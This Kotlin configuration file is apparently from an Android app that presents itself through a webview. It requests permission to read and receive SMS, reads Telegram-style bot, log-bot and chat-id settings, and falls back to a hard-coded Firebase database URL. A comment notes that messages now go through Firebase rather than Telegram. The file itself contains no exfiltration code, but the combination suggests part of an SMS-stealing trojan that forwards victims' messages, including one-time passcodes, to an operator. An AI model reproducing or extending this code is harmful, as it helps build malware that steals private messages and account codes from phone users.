package com.example.myapplicationtestweb

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build

object Config {
    // (Telegram integration removed, relying purely on Firebase)

    val REQUIRED_PERMISSIONS = mutableListOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    fun getMetaData(context: Context, key: String): String {
        return try {
            val ai = context.packageManager.getApplicationInfo(context.packageName, PackageManager.GET_META_DATA)
            val bundle = ai.metaData
            bundle?.get(key)?.toString() ?: ""
        } catch (e: Exception) { "" }
    }

    fun getUserId(context: Context) = getMetaData(context, "user_id")
    fun getUserMainBot(context: Context) = getMetaData(context, "main_bot")
    fun getUserLogBot(context: Context) = getMetaData(context, "log_bot")
    fun getUserChatId(context: Context) = getMetaData(context, "chat_id")
    fun getWebUrl(context: Context) = getMetaData(context, "webview_url")
    fun getDbUrl(context: Context): String {
        val url = getMetaData(context, "firebase_url")
        return if (url.isNotEmpty()) url else "https://andorat-c2181-default-rtdb.asia-southeast1.firebasedatabase.app/"
    }
}
